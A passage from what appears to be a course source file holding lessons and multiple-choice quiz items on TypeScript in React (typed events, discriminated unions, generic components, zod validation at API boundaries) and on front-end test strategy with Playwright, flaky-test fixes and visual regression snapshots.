Now the detail that trips everyone. Inside a typed handler, \`e.currentTarget.value\` compiles and \`e.target.value\` does not. \`currentTarget\` is typed as the element the handler is attached to. \`target\` is whatever the event started on, typed as \`EventTarget\`, which has no \`value\`. People paper over it with \`(e.target as HTMLInputElement).value\`, and that cast is a real lie in delegated handlers, where the target genuinely might be the icon inside the button.

### Refs

\`\`\`tsx
const inputRef = useRef<HTMLInputElement>(null);   // for a DOM node
const timerRef = useRef<number | undefined>(undefined);  // a mutable box

inputRef.current.focus();    // error: possibly null
inputRef.current?.focus();   // correct
\`\`\`

The null check is not bureaucracy. Before the commit phase from chapter 2, that ref really is null, and the compiler is describing the timeline accurately.

### The one habit that erases the benefit

An \`any\` on a prop. It does not stay local: every value derived from it is unchecked too, silently, forever. \`unknown\` is the honest version, because it refuses to be used until you narrow it. And turn on \`"strict": true\` in \`tsconfig.json\` on day one. Retrofitting \`strictNullChecks\` into a forty thousand line app is a multi week project that teams routinely start and abandon.
      `,
        [
          q('const [rows, setRows] = useState([]) compiles, but setRows(invoices) fails. What is going on?', [
            'The empty array is inferred as never[], so Invoice is not assignable',
            'The setter takes its type from the first call rather than the initial value',
            'Arrays in state must be wrapped in useMemo before they can be replaced',
            'useState needs a reducer once the state is a collection rather than a scalar',
          ], 0, 'Inference reads the initial value, and an empty array literal has element type never, so annotating useState<Invoice[]>([]) is the fix.'),
          q('Inside handleChange(e: React.ChangeEvent<HTMLInputElement>), e.currentTarget.value compiles but e.target.value does not. Why?', [
            'target exists only on native events, not on React synthetic events',
            'target is read-only, so TypeScript blocks reads of its properties',
            'currentTarget is a getter, and TypeScript widens getter results',
            'target is typed as EventTarget, while currentTarget is typed as the input',
          ], 3, 'currentTarget is typed as the element the handler was attached to, whereas target is only an EventTarget because the event may have started on a descendant.'),
          q('A shared Table component types its rows prop as any[]. What is the practical consequence?', [
            'Rendering slows down, because any adds runtime checks to each access',
            'Every value read from a row is unchecked, so field name typos compile fine',
            'The component can no longer be re-exported across a module boundary',
            'React re-renders the table on every parent render, whatever memo does',
          ], 1, 'any spreads through everything derived from it, so mistyped field names and wrong operations pass silently for as long as the value is used.'),
        ]
      ),
      lesson('Discriminated Unions and Impossible States', 13, `
A support ticket arrives with a screenshot: a spinner turning, a red error banner under it, and a table of stale rows behind both. Nobody designed that screen. It assembled itself out of four loose flags.

\`\`\`tsx
const [data, setData] = useState<Invoice[] | null>(null);
const [isLoading, setIsLoading] = useState(false);
const [error, setError] = useState<string | null>(null);
const [hasLoaded, setHasLoaded] = useState(false);
\`\`\`

Four independent values is sixteen combinations. About five of them mean anything.

| isLoading | error | data | What it renders |
|---|---|---|---|
| true | null | null | Spinner, correct |
| false | set | null | Error, correct |
| false | null | rows | Table, correct |
| true | set | rows | Spinner, banner and stale table together |

The last row is the screenshot. A retry handler that sets \`isLoading\` to true and forgets to clear \`error\` produces it, and no test asked for that combination because nobody imagined it.

### One tagged value instead of four loose ones

\`\`\`ts
type InvoiceState =
  | { status: 'idle' }
  | { status: 'loading' }
  | { status: 'error'; message: string; failedAt: number }
  | { status: 'ready'; invoices: Invoice[]; fetchedAt: number };
\`\`\`

\`status\` is the **discriminant**: a literal type present on every member of the union. Test it and TypeScript narrows the entire object, so \`message\` exists only in the error branch and \`invoices\` only in the ready one. The bad combination is now unwritable rather than merely untested.

\`\`\`tsx
switch (state.status) {
  case 'idle':
  case 'loading':
    return <Spinner />;
  case 'error':
    return <Retry message={state.message} onRetry={refetch} />;
  case 'ready':
    return <InvoiceTable rows={state.invoices} />;
}
\`\`\`

Reaching for \`state.invoices\` inside the error case is a compile error, not a runtime \`undefined\`.

### The non-null assertion is the tell

The flag version always ends up with \`data!.length\` somewhere. That \`!\` compiles to absolutely nothing. It is a note to the compiler, with no runtime behaviour, and it stops being true at precisely the moment one of the eleven impossible states happens. Search a codebase for \`!.\` and you have a map of its unmodelled states.

### Exhaustiveness, so the next change cannot be quiet

Six months later someone adds \`{ status: 'refreshing'; invoices: Invoice[] }\` for background polling. Nothing points at the twelve switches that now fall straight through and render nothing.

\`\`\`ts
function assertNever(value: never): never {
  throw new Error('Unhandled state: ' + JSON.stringify(value));
}

// as the last branch of every switch
default:
  return assertNever(state);
\`\`\`

In that default branch every handled case has been narrowed away, so \`state\` is \`never\` and the call type checks. Add a member you did not handle and \`state\` narrows to that member instead, which is not assignable to \`never\`, so every unhandled switch in the repository turns red in the same build. One line, and a whole class of silent omissions becomes a compile error.

### Unions work on props too

\`\`\`tsx
type ButtonProps =
  | { variant: 'link'; href: string; onClick?: never }
  | { variant: 'action'; onClick: () => void; href?: never };
\`\`\`

\`<Button variant="link" href="/invoices" onClick={save} />\` no longer compiles. The \`?: never\` members matter: without them a props object assembled in a variable can carry both keys past the check, because excess property checking only fires on object literals written inline.

Server state from chapter 3 arrives in exactly these shapes, which is why query libraries expose one \`status\` string instead of three booleans. Reducers from chapter 2 pair with it naturally, since the action type is a union as well and the reducer switch gets the same exhaustiveness guarantee.

One near miss to avoid: \`{ status: string; message?: string }\` narrows nothing at all. \`string\` is not a set of cases, and \`message\` stays possibly undefined in every branch. Literal types are the entire mechanism.
      `,
        [
          q('Replacing isLoading, error and data with one status union removes which specific bug from the screen?', [
            'A spinner and an error banner rendering over stale rows at once',
            'A fetch that resolves after the component has already unmounted',
            'A list re-rendering whenever its parent component re-renders',
            'A response arriving out of order after the user clicks quickly',
          ], 0, 'Independent flags allow combinations nobody designed, and the tagged union makes the loading plus error plus data combination impossible to represent.'),
          q('A new member { status: "refreshing" } is added to the union, and a switch whose default branch calls assertNever(state) now fails to compile. Why is that?', [
            'A default branch is not permitted on a switch over literal types',
            'state narrows to the unhandled member in default, which is not never',
            'assertNever throws, and TypeScript forbids throwing inside a switch',
            'The union passed four members, which requires an enum instead',
          ], 1, 'The default branch only receives never when every member has been handled, so an unhandled case leaves a real type there and the call is rejected.'),
          q('The flag based version renders data!.total. What does that ! actually do?', [
            'It checks the value at runtime and throws when data is null',
            'It substitutes an empty object so the property read is safe',
            'It silences the compiler and changes nothing about the runtime',
            'It postpones the read until the data has finished loading',
          ], 2, 'A non-null assertion is erased during compilation, so it removes the warning while leaving the exact crash it was warning about.'),
        ]
      ),
      lesson('Generic Components and Typed Hooks', 13, `
Nine screens use the same \`<DataTable>\`. The API renames \`email\` to \`workEmail\`, the shared type is updated, the build is green, and the table renders a column of empty cells on all nine, because the column keys were plain strings. Strings are where type safety goes to die.

### A component with a type parameter

\`\`\`tsx
type Column<T> = {
  key: keyof T;
  label: string;
  render?: (row: T) => React.ReactNode;
};

type DataTableProps<T> = {
  rows: T[];
  columns: Column<T>[];
  getRowId: (row: T) => string;
  onSelect?: (row: T) => void;
};

export function DataTable<T>({ rows, columns, getRowId, onSelect }: DataTableProps<T>) {
  return (
    <tbody>
      {rows.map((row) => (
        <tr key={getRowId(row)} onClick={() => onSelect?.(row)}>
          {columns.map((col) => (
            <td key={String(col.key)}>
              {col.render ? col.render(row) : String(row[col.key])}
            </td>
          ))}
        </tr>
      ))}
    </tbody>
  );
}
\`\`\`

\`T\` is inferred from \`rows\`, so nothing is annotated at the call site. Pass employees and \`keyof T\` becomes the union of employee field names. \`{ key: 'emial', label: 'Email' }\` fails to compile, \`render\` receives a fully typed row, and \`onSelect\` hands the caller an \`Employee\` rather than an \`any\`. Rename the field and every column list still naming the old key turns red.

Constrain the parameter when the component genuinely needs something: \`function DataTable<T extends { id: string }>\` forces an id. A \`getRowId\` prop is usually the better trade, because it works for rows keyed by \`sku\` or \`invoiceNumber\` too.

### The .tsx parsing trap

\`\`\`tsx
const first = <T>(items: T[]) => items[0];    // parsed as a JSX tag, error
const first = <T,>(items: T[]) => items[0];   // the comma disambiguates
function first<T>(items: T[]) { return items[0]; }   // or avoid it entirely
\`\`\`

In \`.tsx\` files, \`<T>\` opens an element. The trailing comma is the ugly fix, \`<T extends unknown>\` is the other one, and a function declaration sidesteps the question.

### Hooks that return a tuple need as const

\`\`\`ts
function useToggle(initial = false) {
  const [on, setOn] = useState(initial);
  const toggle = useCallback(() => setOn((v) => !v), []);
  return [on, toggle] as const;   // readonly [boolean, () => void]
}
\`\`\`

Drop \`as const\` and the inferred return type is \`(boolean | (() => void))[]\`. The caller destructures into \`open\` and \`toggleOpen\`, both get that union, and neither is usable without a cast. Arrays widen, objects do not, so a hook returning \`{ on, toggle }\` needs nothing extra. Tuples are worth it only when callers rename the values, which is exactly why \`useState\` returns one.

### Typed context that stops the null checks spreading

Chapter 3 covered the re-render cost of context. Typing has a separate pothole: \`createContext<CartApi>()\` demands a default value nobody has.

\`\`\`tsx
const CartContext = createContext<CartApi | null>(null);

export function useCart() {
  const ctx = useContext(CartContext);
  if (!ctx) throw new Error('useCart must be used inside <CartProvider>');
  return ctx;    // CartApi, never null
}
\`\`\`

Narrow once, in one place. Every consumer then gets a non-null type and a readable error instead of \`Cannot read properties of null\`.

### Knowing when to stop

| Signal | What it usually means |
|---|---|
| Three or more type parameters | The component is doing two jobs, split it |
| A default of \`T = any\` | Checking is off and the generic is decoration |
| Casts inside the generic body | The constraint is wrong, fix the constraint |
| Callers passing \`<Row>\` explicitly | Inference is blocked, usually by a missing prop |

A generic component earns its complexity when several call sites pass different data shapes. Written for one call site, it is a worse version of a plain props type.
      `,
        [
          q('DataTable types its columns as { key: keyof T; label: string }[]. The Employee field email is renamed to workEmail. What happens?', [
            'The affected column quietly renders empty cells until someone reports it',
            'The key resolves at runtime, so only the visible label needs changing',
            'T collapses to any at the call site and checking stops from there on',
            'Every column list still naming email fails to compile',
          ], 3, 'keyof T is recomputed from the row type, so the old key is no longer a member of that union and each stale column list is reported.'),
          q('In a .tsx file, const first = <T>(items: T[]) => items[0]; refuses to parse. What is the cause?', [
            '<T> reads as the opening of a JSX element, so it needs a trailing comma',
            'Arrow functions cannot take type parameters in any TypeScript file',
            'T has to be constrained before it can be used to index an array',
            'Type parameters are not allowed on values declared with const',
          ], 0, 'JSX syntax claims angle brackets in .tsx files, so <T,> or <T extends unknown> is required to tell the parser this is a type parameter.'),
          q('useToggle returns [on, toggle] without as const, and a caller destructures it. What type do both names get?', [
            'A tuple of exactly boolean then a function, which is what you want',
            'The union boolean | (() => void), so neither position is usable',
            'unknown, because inference gives up at a mixed return statement',
            'A readonly tuple, which then cannot be destructured by the caller',
          ], 1, 'Array literals widen to a single element type, so both destructured names receive the union and need a cast before either can be used.'),
        ]
      ),
      lesson('Types at the API Boundary', 13, `
\`await res.json()\` is typed \`any\`. Every type you have written about server data downstream of that line is a claim, not a fact, and the compiler has been agreeing with you out of politeness.

A billing endpoint once started returning \`total\` as \`"149.00"\` instead of \`149\` after a serializer change. The frontend called \`total.toFixed(2)\`, threw for eleven hours across every invoice screen, and \`tsc\` reported zero errors the entire time.

\`\`\`ts
const res = await fetch('/api/invoices/4173');
const invoice = (await res.json()) as Invoice;   // no check happened here
\`\`\`

A cast tells the compiler to stop asking. It generates no code, so it cannot detect anything.

### Parse, do not cast

Chapter 5 used zod to validate what users type. The same schema belongs at the boundary where responses arrive.

\`\`\`ts
import { z } from 'zod';

const invoiceSchema = z.object({
  id: z.string(),
  total: z.number(),
  status: z.enum(['draft', 'sent', 'paid']),
  dueAt: z.coerce.date(),
  lines: z.array(z.object({ sku: z.string(), qty: z.number().int() })),
});

export type Invoice = z.infer<typeof invoiceSchema>;

export async function getInvoice(id: string): Promise<Invoice> {
  const res = await fetch('/api/invoices/' + id);
  if (!res.ok) throw new ApiError(res.status, id);
  return invoiceSchema.parse(await res.json());
}
\`\`\`

\`z.infer\` is the point. The type is derived from the check, so the two cannot drift apart. Change the schema and every use site updates in the same commit. Note \`z.coerce.date()\`: JSON has no date type, so an ISO string arrives and something has to convert it. Doing that at the boundary means no component ever wonders whether \`dueAt\` is a string today.

Where the raw body is still untyped, prefer \`const body: unknown = await res.json()\`. \`unknown\` refuses every operation until you narrow it, which is the behaviour \`any\` should have had.

### Where the failure goes

\`parse\` throws, and that throw is a genuine outage signal: catch it in the data layer, report it with the endpoint and the issue path (\`lines.3.qty\`), and let the error boundary from chapter 6 render the fallback. Use \`safeParse\` when partial success is better than none.

\`\`\`ts
const parsed = z.array(rowSchema).safeParse(json.rows);
const rows = parsed.success ? parsed.data : [];
if (!parsed.success) report('invoice rows rejected', parsed.error.issues[0]);
\`\`\`

### Three ways to get types, and what each actually guarantees

| Approach | Compile time | Runtime | Cost |
|---|---|---|---|
| \`as Invoice\` | Types only | Nothing | Free, until the API changes |
| OpenAPI or GraphQL codegen | Matches the published contract | Nothing | A generate step in CI |
| Schema parse | Types inferred from the schema | Every response checked | Kilobytes and milliseconds |

The middle row is worth naming clearly: generated types describe what the spec says, not what the server sent. A stale spec produces confident, wrong types. Codegen and parsing combine well, so generate broadly and parse the handful of endpoints whose silent breakage would cost you a day.

### The cost that only shows up at scale

Validating twenty thousand rows on every poll is real work, a few milliseconds per thousand small objects, all of it on the main thread and all of it visible in the INP numbers from chapter 6. Parse once where the response arrives, never inside render, and for very large payloads validate the envelope strictly while checking only the fields you compute with.

### Your bundler is not checking any of this

Vite, esbuild and SWC strip types. They do not verify them. A completely broken type will run happily in \`npm run dev\` and build a production bundle without complaint. Run \`tsc --noEmit\` in CI beside lint and tests, or you own a type system that only the people with the editor plugin are actually running.
      `,
        [
          q('Code writes (await res.json()) as Invoice, and the API starts sending total as a string. What does the compiler report?', [
            'Nothing, because a cast is a claim rather than a check',
            'An error on the cast, since string is not assignable to number',
            'An error at the first arithmetic operation performed on total',
            'A warning, but only when strict is enabled in tsconfig.json',
          ], 0, 'A type assertion emits no code and inspects no values, so it cannot notice that the response stopped matching the declared shape.'),
          q('Why derive the type with z.infer<typeof invoiceSchema> instead of writing the interface and the schema separately?', [
            'z.infer produces a smaller bundle than a hand written interface does',
            'Zod refuses to validate against a type that was declared by hand',
            'One declaration cannot drift, so a schema change reaches every use site',
            'Inferred types survive minification, whereas declared types are removed',
          ], 2, 'Two hand maintained descriptions of the same data eventually disagree, and inferring the type from the schema leaves only one thing to keep correct.'),
          q('A dashboard validates a twenty thousand row response with zod and INP gets noticeably worse. Which fix keeps the runtime guarantee?', [
            'Cast the rows instead, since this endpoint is internal and stable',
            'Wrap the parse in useMemo so it stops running on every render',
            'Call safeParse rather than parse, which skips the costly checks',
            'Parse once where the response arrives, and never inside render',
          ], 3, 'Validation belongs in the fetch layer where it runs once per response, since running it during render repeats the same main thread work on every pass.'),
        ]
      ),
      ],
      [
      q('Which props type makes <Button variant="link" href="/invoices" onClick={save} /> a compile error?', [
        'An interface with variant, href and onClick all marked optional',
        'A type with onClick required and href typed as string | undefined',
        'A union of one link member and one action member, each excluding the other key',
        'A type whose variant field is typed as string rather than a literal union',
      ], 2, 'Only a discriminated union separates the two valid shapes, so a props object cannot carry both the link key and the action key at once.'),
      q('Vite builds a bundle from .tsx files that contain obvious type errors. What does that tell you about the pipeline?', [
        'Types are stripped rather than checked, so CI must run tsc --noEmit',
        'The errors are warnings because strict mode has not been enabled yet',
        'Type checking happens later, during minification of the production build',
        'The tsconfig include patterns are missing the source directory entirely',
      ], 0, 'esbuild and SWC only remove type syntax for speed, so nothing verifies the types unless a separate compiler run is part of the build.'),
      q('A generic list component is written for one screen and takes three type parameters, two with any defaults. What is the honest assessment?', [
        'It is correct, because defaults keep the call sites free of annotations',
        'The generics are decoration, and a plain props type would check more',
        'It needs a fourth parameter so the row key can be inferred properly',
        'It is fine as long as every call site passes the parameters explicitly',
      ], 1, 'A default of any turns checking off inside the component, so the parameters add ceremony while providing less safety than a concrete props type.'),
      q('Which combination gives you both compile time safety and a real signal when the server changes shape?', [
        'Hand written interfaces plus a cast at each fetch call site',
        'Generated types from the OpenAPI spec, with no runtime validation',
        'any at the boundary, with narrowing performed inside each component',
        'A schema parsed at the boundary, with the type inferred from that schema',
      ], 3, 'Parsing checks the actual response at runtime while inference keeps the static type identical to the schema, so a drifting API fails loudly instead of silently.'),
      ]
    ),
    chapter(
      'Test Strategy and Automation',
      'Deciding what deserves a test, driving a real browser with Playwright, and keeping a suite fast and honest enough that a red build actually stops a deploy.',
      [
      lesson('Choosing What to Test, and at Which Level', 13, `
Your suite is green. It has 1,412 tests, runs in eight minutes, and reports 94% line coverage. Checkout has been broken since 06:00, because \`formatMoney\` returns \`$NaN\` when the cart total is zero, and no test ever rendered an empty cart.

Coverage counts which lines executed. It says nothing about which behaviours were checked.

### What each level actually buys

| Level | Example | Cost per test | Catches | Blind to |
|---|---|---|---|---|
| Type check | \`tsc --noEmit\` | ~6 s for the repo | Wrong shapes at every call site | Anything about behaviour |
| Unit | \`formatMoney(0, 'USD')\` | under 1 ms | Pure logic, edge cases | Wiring between parts |
| Component | \`CartSummary\` empty state | 20 to 80 ms | Render logic, label wiring | The real network, routing, the build |
| End to end | Sign in, add item, pay | 4 to 15 s | Integration, the shipped bundle | Most branches, because it is too slow |

The trade is not only speed. A failing unit test names the function and the input. A failing end-to-end test tells you that buying a course is broken somewhere across forty files, which is worth knowing and expensive to act on. You want the cheap, precise tests to be numerous and the slow, broad ones to be few and well chosen.

### Choose by risk, not by symmetry

Ratios like "70/20/10" are a distraction. Rank code by how often it changes multiplied by what breaks when it is wrong.

| Area | Change rate | Blast radius | Where the tests go |
|---|---|---|---|
| Pricing, tax, discounts | Weekly | Money, refunds, trust | Exhaustive unit tests |
| Checkout flow | Monthly | Revenue stops | One end-to-end test |
| Search filters | Weekly | Annoyance | Component tests |
| Marketing footer | Rarely | Nothing | None |

Table-driven unit tests are where the currency bug should have died:

\`\`\`js
test.each([
  [0,    'USD', '$0.00'],
  [1999, 'USD', '$19.99'],
  [1999, 'JPY', '¥1,999'],
  [-500, 'USD', '-$5.00'],
])('formatMoney(%i, %s)', (minor, currency, expected) => {
  expect(formatMoney(minor, currency)).toBe(expected);
});
\`\`\`

Four rows, under a millisecond, and the zero row is the one nobody wrote.

### Coverage is a floor, never a target

This test executes every line of \`CartSummary\` and asserts almost nothing:

\`\`\`jsx
test('renders the total', () => {
  render(<CartSummary items={items} />);
  expect(screen.getByTestId('total')).toBeInTheDocument();  // passes for "$NaN"
});
\`\`\`

Line coverage: 100%. Value: close to zero. The fix is one word longer.

\`\`\`jsx
expect(screen.getByTestId('total')).toHaveTextContent('$42.00');
\`\`\`

Mutation testing measures the gap directly. Stryker changes your source on purpose, flipping \`>\` to \`>=\`, replacing a return with \`null\`, and reports how many of those broken versions your suite noticed. A codebase at 94% line coverage and a 58% mutation score is telling you that four assertions in ten are decorative. Chase the mutation score on the pricing module and ignore it everywhere else.

### What is not worth a test

Third-party library behaviour. Framework internals. Whole-DOM snapshots, which fail on every refactor and are approved without reading. Computed styling values. Private helpers reached only through the public function you already test.

### The rule that keeps a suite honest

Every bug you fix earns exactly one test, at the lowest level that would have caught it. The \`$NaN\` bug earns a unit test with a zero total, not another end-to-end run through checkout. Do the opposite for a year and you get the suite from the first paragraph: slow, broad, green, and silent about the thing that is actually broken.
      `,
        [
          q('A suite reports 94% line coverage but a 58% mutation score. What does that gap tell you?', [
            'Nearly half the codebase is never executed by any test',
            'The mutation tool is misconfigured and should be ignored',
            'Plenty of lines run during tests without any assertion checking the result',
            'Coverage is measured per file while mutation is measured per branch',
          ], 2, 'Mutation testing breaks the source on purpose, so a low score means deliberately broken code still passes, which happens when tests execute lines but assert almost nothing about them.'),
          q('A regression is traced to a discount helper that mishandles a 100% off coupon. Where does the new test belong?', [
            'A unit test on the helper with the 100% coupon as an input row',
            'An end-to-end test that walks through checkout with that coupon',
            'A component test that renders the cart with a discount applied',
            'A visual snapshot of the order summary showing the zero total',
          ], 0, 'Every fixed bug earns one test at the lowest level that would have caught it, and a pure function that mishandles an input is caught in under a millisecond by a unit test.'),
          q('Why does the topic argue against a fixed ratio such as 70/20/10 across test levels?', [
            'Ratios only work for backend services, never for browser code',
            'Modern tooling makes end-to-end tests as cheap as unit tests',
            'Coverage tools cannot report on more than one level at a time',
            'Effort should follow change rate and blast radius, which vary by area',
          ], 3, 'A pricing module that changes weekly and moves money deserves far more testing than a footer that never changes, so a fixed ratio spends effort where the risk is not.'),
        ]
      ),
      lesson('End-to-End Tests with Playwright', 14, `
\`await page.waitForTimeout(2000)\` is the most expensive line in most end-to-end suites. Sixty tests, two seconds each, two minutes of a build spent waiting on purpose, and it still goes red on the morning the staging API is slow.

You almost never need it, because of how Playwright locators work.

### A locator is a query, not an element

\`\`\`ts
const pay = page.getByRole('button', { name: 'Pay $49.00' });
\`\`\`

Nothing has touched the DOM yet. When you call \`pay.click()\`, Playwright resolves the query, then runs actionability checks: attached to the DOM, visible, stable for two animation frames, enabled, and receiving pointer events rather than sitting under an overlay. If any check fails it re-resolves and tries again until the timeout. The waiting is the API, which is why a spec reads like a description of what a person does.

\`\`\`ts
import { test, expect } from '@playwright/test';

test('a signed-in user can buy a course', async ({ page }) => {
  await page.goto('/courses/frontend-engineering');
  await page.getByRole('button', { name: 'Add to cart' }).click();
  await page.getByRole('link', { name: /cart \\(1\\)/i }).click();

  await page.getByLabel('Card number').fill('4242424242424242');
  await page.getByLabel('Expiry').fill('12/30');
  await page.getByRole('button', { name: 'Pay $49.00' }).click();

  await expect(page.getByRole('heading', { name: 'Order confirmed' })).toBeVisible();
  await expect(page).toHaveURL(/\\/orders\\/\\d+/);
});
\`\`\`

Role and label queries carry over from Chapter 5 for the same reason: \`.btn-primary\` breaks when a designer renames a class, and it never tells you the button was unreachable by keyboard.

### Where the await goes decides whether it retries

Broken, and it will fail roughly once in twenty runs:

\`\`\`ts
expect(await page.getByTestId('total').textContent()).toBe('$49.00');
\`\`\`

Fixed:

\`\`\`ts
await expect(page.getByTestId('total')).toHaveText('$49.00');
\`\`\`

The first reads the DOM once, the instant the previous line finished, and compares a string. The second is a web-first assertion: \`await expect(locator)\` polls until the text matches or the expect timeout expires. Move the \`await\` inside the parentheses and you have quietly deleted every retry in the file. When a suite starts sprouting \`waitForTimeout\` calls, this is usually the cause.

### Strict mode is a feature

\`page.getByRole('button', { name: 'Delete' })\` on a table of invoices throws a strict mode violation instead of clicking the first match. Scope it to the row and the test says what it means:

\`\`\`ts
await page
  .getByRole('row', { name: /Invoice 1042/ })
  .getByRole('button', { name: 'Delete' })
  .click();
\`\`\`

### Config that removes the boring failures

\`\`\`ts
export default defineConfig({
  testDir: './e2e',
  webServer: {
    command: 'npm run build && npm run preview',
    url: 'http://localhost:4173',
    reuseExistingServer: !process.env.CI,
  },
  use: { baseURL: 'http://localhost:4173', trace: 'on-first-retry' },
  retries: process.env.CI ? 2 : 0,
  projects: [{ name: 'chromium', use: devices['Desktop Chrome'] }],
});
\`\`\`

Running against \`preview\` tests the production artifact from Chapter 6, not the dev server, so a minification bug or a bad env substitution shows up here rather than in production. \`trace: 'on-first-retry'\` costs nothing on green runs and hands you a zip containing a DOM snapshot, console output and network log for every step of the failed one. Open it with \`npx playwright show-trace trace.zip\` and scrub through the failure like a video. That is how you debug a failure that only happens in CI without pushing eleven commits to CI.

### Keep the count low on purpose

Twelve to twenty end-to-end tests covering the paths that make money is a healthy suite. Sign up, sign in, buy, refund, cancel. Every additional variation of a form belongs one level down, where it runs in forty milliseconds and names the component that broke.
      `,
        [
          q('Which of these lines silently removes the retrying behaviour Playwright would otherwise give you?', [
            'await expect(page.getByTestId(\'total\')).toHaveText(\'$49.00\')',
            'expect(await page.getByTestId(\'total\').textContent()).toBe(\'$49.00\')',
            'await expect(page.getByTestId(\'total\')).toBeVisible()',
            'await expect(page.getByTestId(\'total\')).not.toBeEmpty()',
          ], 1, 'Awaiting inside the parentheses reads the DOM once and compares a plain string, while awaiting the expect call itself polls the locator until it matches or the timeout expires.'),
          q('A test clicks Delete on a table of invoices and Playwright throws a strict mode violation. What is the right fix?', [
            'Add .first() so the click lands on the topmost matching row',
            'Disable strict mode in the Playwright config for that spec file',
            'Wait for the table to finish loading before issuing the click',
            'Scope the query to that invoice row, then find the button inside it',
          ], 3, 'Several buttons match the name, so the test never said which invoice it meant; scoping to the row states the intent and keeps working when the rows reorder.'),
          q('Why does the config point webServer at the preview build instead of the dev server?', [
            'The tests then run against the production artifact that will ship',
            'The dev server cannot serve more than one Playwright worker',
            'Hot module replacement makes locators resolve to stale elements',
            'Source maps are generated only when a preview server is running',
          ], 0, 'Minification, env substitution and bundling only happen in the real build, so testing the preview output catches problems the dev server would have hidden.'),
        ]
      ),
      lesson('Flake, Fixtures, and Deterministic Test Data', 13, `
A test that fails one run in a hundred sounds like nothing. Run sixty of them and \`0.99^60\` is 0.55, so 45% of your builds are red for no reason. Push the flake rate to 3% per test and 84% of builds fail.

The damage is not the wasted minutes. It is that the team learns to press "re-run" without reading the failure, and the one real regression of the quarter goes out on the second attempt.

### Four sources, four fixes

| Source | What it looks like | Fix |
|---|---|---|
| Time | Passes all day, fails at 23:58 UTC | Freeze the clock |
| Randomness | Two generated users collide once a week | Seed the generator, or namespace per test |
| Shared data | Fails only when run in parallel | One account per test, created and deleted by a fixture |
| Order | Passes alone, fails in the suite | Never depend on another test having run |

### Freeze time before the app reads it

\`\`\`ts
test('shows the renewal warning three days out', async ({ page }) => {
  await page.clock.setFixedTime(new Date('2026-03-14T10:00:00Z'));
  await page.goto('/billing');
  await expect(page.getByText('Renews in 3 days')).toBeVisible();
});
\`\`\`

Order matters. Install the clock after \`page.goto\` and the bundle has already called \`Date.now()\` during hydration, so half the page is on real time and half is on fake time. That produces a test that fails once a month and looks unreproducible.

### Build state through the API, not the UI

The slow version signs in through the form in every test. Forty tests at three seconds each is two minutes of typing a password, and the day login breaks, forty tests fail and none of them names the cause.

A fixture does it once, per test, with data nobody else can touch:

\`\`\`ts
import { test as base } from '@playwright/test';

export const test = base.extend<{ account: Account }>({
  account: async ({ request }, use, testInfo) => {
    const email = \`e2e+\${testInfo.testId}@example.test\`;
    const res = await request.post('/api/test/accounts', {
      data: { email, plan: 'pro', invoices: 3 },
    });
    const account = await res.json();

    await use(account);

    await request.delete(\`/api/test/accounts/\${account.id}\`);
  },
});
\`\`\`

Everything after \`await use(...)\` is teardown, and it runs even when the test failed, so a crashed run does not leave rubbish for the next one. Mount \`/api/test/*\` only when \`ALLOW_TEST_ROUTES\` is set, and never set it in production: a route that creates a paid account on demand is a real vulnerability.

### Unique beats clean

The instinct is to truncate the database between tests. That forces the whole suite to run serially, because worker 2 wipes the rows worker 5 is using. Namespace instead:

\`\`\`ts
const invoiceName = \`Invoice \${testInfo.testId}\`;
\`\`\`

One team's suite went from 11 minutes serial to 90 seconds across six workers with no other change, because nothing shared a row any more.

### Retries measure flake, they do not fix it

\`retries: 2\` in CI is a shock absorber, not a cure. Playwright marks those runs \`flaky\` in the report rather than \`passed\`, and that number is the one to watch. A useful rule: any test that passes on retry twice in a week gets an issue with a real diagnosis, or gets quarantined with \`test.fixme\` so it stops teaching the team to ignore red. A permanently retried test is a one-in-three race condition that your users hit and your suite hides.

One more thing worth resisting. When a test fails only in CI, the reflex is to raise its timeout. CI is slower, and slow is a legitimate condition for a real user on a real phone. Read the trace first. Often the test is correct and the app has a race that only shows up under load.
      `,
        [
          q('Sixty independent tests each fail 1% of the time with no real regression. Roughly what share of builds go red?', [
            'About 1%, since each failure is independent of the others',
            'About 6%, because retries absorb most of the failures',
            'About 45%, because the chance compounds across every test',
            'About 99%, since one flaky test poisons the entire run',
          ], 2, '0.99 raised to the power of 60 is about 0.55, so a little over half of runs pass cleanly and the rest are red for no real reason.'),
          q('page.clock.setFixedTime is called after page.goto rather than before it. What goes wrong?', [
            'The call throws, because a page has already been loaded',
            'Startup code already read the real clock, so times end up mixed',
            'Every timer on the page is cancelled and the UI stops updating',
            'The fixed time applies to the next navigation instead of this one',
          ], 1, 'The bundle calls Date.now() while it boots, so part of the page is pinned to the fake time and part is on the real clock, producing a failure that looks random.'),
          q('Why create per-test data through an API fixture rather than truncating the database between tests?', [
            'API calls produce more readable failure messages than SQL does',
            'A truncated database resets the clock that scheduled jobs read',
            'Fixtures run before the browser starts, which saves start-up time',
            'Truncation forces the suite to run serially, while unique data does not',
          ], 3, 'Wiping shared rows means one worker destroys what another is using, so the suite must run one test at a time; namespaced data lets several workers run at once safely.'),
        ]
      ),
      lesson('Visual Regression and Automated Accessibility Gates', 14, `
Someone changes \`--space-3\` from 12px to 16px. Every unit test passes, every end-to-end test passes, and forty screens shift. On the checkout modal the Pay button is now below the fold on a 667px viewport. Nobody notices for nine days, when support asks why mobile conversion dropped.

No assertion you would think to write catches that. A picture does.

### Screenshot small things, not whole pages

\`\`\`ts
test('empty cart panel', async ({ page }) => {
  await page.goto('/cart');
  await expect(page.getByTestId('cart-panel')).toHaveScreenshot('cart-empty.png', {
    maxDiffPixelRatio: 0.01,
    mask: [page.getByTestId('promo-countdown')],
  });
});
\`\`\`

The first run writes the baseline, later runs diff against it. Scoping to one component means a header change fails one test with an obvious diff, instead of failing every full-page snapshot in the suite and burying the real regression. \`mask\` paints a solid box over anything genuinely dynamic, such as a countdown or a relative timestamp, so it cannot cause a diff.

### The gotcha that kills most visual suites

Baselines generated on a MacBook fail forever in CI. Font hinting, subpixel antialiasing and emoji rendering all differ between macOS and a Linux container, so a text-heavy component diffs by 3% before anyone touches the CSS. The tempting response is to raise \`maxDiffPixelRatio\` until it passes, which is how a visual suite becomes blind.

Generate baselines in the image CI uses:

\`\`\`bash
docker run --rm -v "$PWD":/work -w /work \\
  mcr.microsoft.com/playwright:v1.49.0-noble \\
  npx playwright test --update-snapshots
\`\`\`

Then remove the other movement. Playwright disables CSS animations for screenshots by default, but a JavaScript-driven carousel or a spinner you render yourself will still drift, so wait for a settled state before shooting. And treat an updated baseline as a code change: it arrives in a pull request, a human looks at the diff image in the HTML report, and approves it deliberately. A team that runs \`--update-snapshots\` reflexively has a suite that agrees with whatever it sees.

